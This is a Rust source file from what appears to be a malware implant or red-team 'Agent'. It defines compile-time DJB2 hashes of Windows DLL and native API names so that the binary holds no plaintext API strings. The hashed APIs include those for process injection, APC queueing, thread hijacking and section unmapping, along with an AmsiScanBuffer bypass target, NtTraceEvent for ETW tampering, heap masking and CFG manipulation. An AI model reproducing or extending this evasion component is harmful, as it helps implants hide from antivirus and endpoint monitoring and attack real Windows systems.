#![allow(dead_code)]
// __NAME__ Agent — DJB2 Hash Constants (no-std compatible)
//
// All module and API name resolution uses hash comparison — zero plaintext
// strings in the binary for Nt*/Zw* names.

/// Compile-time DJB2 hash (case-insensitive, seed 5381).
pub const fn djb2(s: &[u8]) -> u32 {
    let mut h: u32 = 5381;
    let mut i = 0;
    while i < s.len() {
        let mut c = s[i];
        if c >= b'A' && c <= b'Z' {
            c += b'a' - b'A';
        }
        h = h.wrapping_mul(33).wrapping_add(c as u32);
        i += 1;
    }
    h
}

/// Runtime DJB2 hash for export name comparison.
#[inline]
pub fn djb2_runtime(s: &[u8]) -> u32 {
    let mut h: u32 = 5381;
    for &c in s {
        let c = if c >= b'A' && c <= b'Z' { c + (b'a' - b'A') } else { c };
        h = h.wrapping_mul(33).wrapping_add(c as u32);
    }
    h
}

// ── Module hashes ──

pub const HASH_NTDLL: u32 = djb2(b"ntdll.dll");
pub const HASH_KERNEL32: u32 = djb2(b"kernel32.dll");
pub const HASH_KERNELBASE: u32 = djb2(b"kernelbase.dll");
pub const HASH_WININET: u32 = djb2(b"wininet.dll");
pub const HASH_USER32: u32 = djb2(b"user32.dll");

// ── Nt API hashes ──

pub const HASH_NT_ALLOCATE_VM: u32 = djb2(b"NtAllocateVirtualMemory");
pub const HASH_NT_FREE_VM: u32 = djb2(b"NtFreeVirtualMemory");
pub const HASH_NT_PROTECT_VM: u32 = djb2(b"NtProtectVirtualMemory");
pub const HASH_NT_WRITE_VM: u32 = djb2(b"NtWriteVirtualMemory");
pub const HASH_NT_READ_VM: u32 = djb2(b"NtReadVirtualMemory");
pub const HASH_NT_CREATE_THREAD_EX: u32 = djb2(b"NtCreateThreadEx");
pub const HASH_NT_OPEN_PROCESS: u32 = djb2(b"NtOpenProcess");
pub const HASH_NT_CLOSE: u32 = djb2(b"NtClose");
pub const HASH_NT_QUERY_INFO: u32 = djb2(b"NtQuerySystemInformation");
pub const HASH_NT_DELAY_EXECUTION: u32 = djb2(b"NtDelayExecution");
pub const HASH_NT_SUSPEND_THREAD: u32 = djb2(b"NtSuspendThread");
pub const HASH_NT_RESUME_THREAD: u32 = djb2(b"NtResumeThread");
pub const HASH_NT_OPEN_THREAD: u32 = djb2(b"NtOpenThread");
pub const HASH_NT_QUEUE_APC: u32 = djb2(b"NtQueueApcThread");
pub const HASH_NT_TRACE_EVENT: u32 = djb2(b"NtTraceEvent");
pub const HASH_NT_QUERY_INFO_PROCESS: u32 = djb2(b"NtQueryInformationProcess");
pub const HASH_NT_WAIT_FOR_SINGLE_OBJECT: u32 = djb2(b"NtWaitForSingleObject");
pub const HASH_NT_TERMINATE_PROCESS: u32 = djb2(b"NtTerminateProcess");
pub const HASH_NT_GET_CONTEXT_THREAD: u32 = djb2(b"NtGetContextThread");
pub const HASH_NT_SET_CONTEXT_THREAD: u32 = djb2(b"NtSetContextThread");
pub const HASH_NT_UNMAP_VIEW_OF_SECTION: u32 = djb2(b"NtUnmapViewOfSection");
pub const HASH_NT_QUERY_VM: u32 = djb2(b"NtQueryVirtualMemory");
pub const HASH_NT_DUPLICATE_OBJECT: u32 = djb2(b"NtDuplicateObject");

// ── AMSI module + function hashes ──

pub const HASH_AMSI_DLL: u32 = djb2(b"amsi.dll");
pub const HASH_AMSI_SCAN_BUFFER: u32 = djb2(b"AmsiScanBuffer");

// ── Heap walking API hashes (kernel32, for heap masking) ──

pub const HASH_GET_PROCESS_HEAP: u32 = djb2(b"GetProcessHeap");
pub const HASH_GET_PROCESS_HEAPS: u32 = djb2(b"GetProcessHeaps");
pub const HASH_HEAP_WALK: u32 = djb2(b"HeapWalk");
pub const HASH_HEAP_LOCK: u32 = djb2(b"HeapLock");
pub const HASH_HEAP_UNLOCK: u32 = djb2(b"HeapUnlock");

// ── Registry API hashes (for runtime resolution) ──

pub const HASH_ADVAPI32: u32 = djb2(b"advapi32.dll");
pub const HASH_REG_OPEN_KEY_EX_A: u32 = djb2(b"RegOpenKeyExA");
pub const HASH_REG_OPEN_KEY_EX_W: u32 = djb2(b"RegOpenKeyExW");
pub const HASH_REG_QUERY_VALUE_EX_A: u32 = djb2(b"RegQueryValueExA");
pub const HASH_REG_QUERY_VALUE_EX_W: u32 = djb2(b"RegQueryValueExW");
pub const HASH_REG_CLOSE_KEY: u32 = djb2(b"RegCloseKey");

// ── Process mitigation policy (kernel32) ──

pub const HASH_GET_PROCESS_MITIGATION_POLICY: u32 = djb2(b"GetProcessMitigationPolicy");

// ── CFG compliance (kernelbase) ──

pub const HASH_SET_PROCESS_VALID_CALL_TARGETS: u32 = djb2(b"SetProcessValidCallTargets");

// ── Prefix hashes (for Zw*/Nt* matching) ──

pub const HASH_PREFIX_ZW: u32 = djb2(b"Zw");
pub const HASH_PREFIX_NT: u32 = djb2(b"Nt");
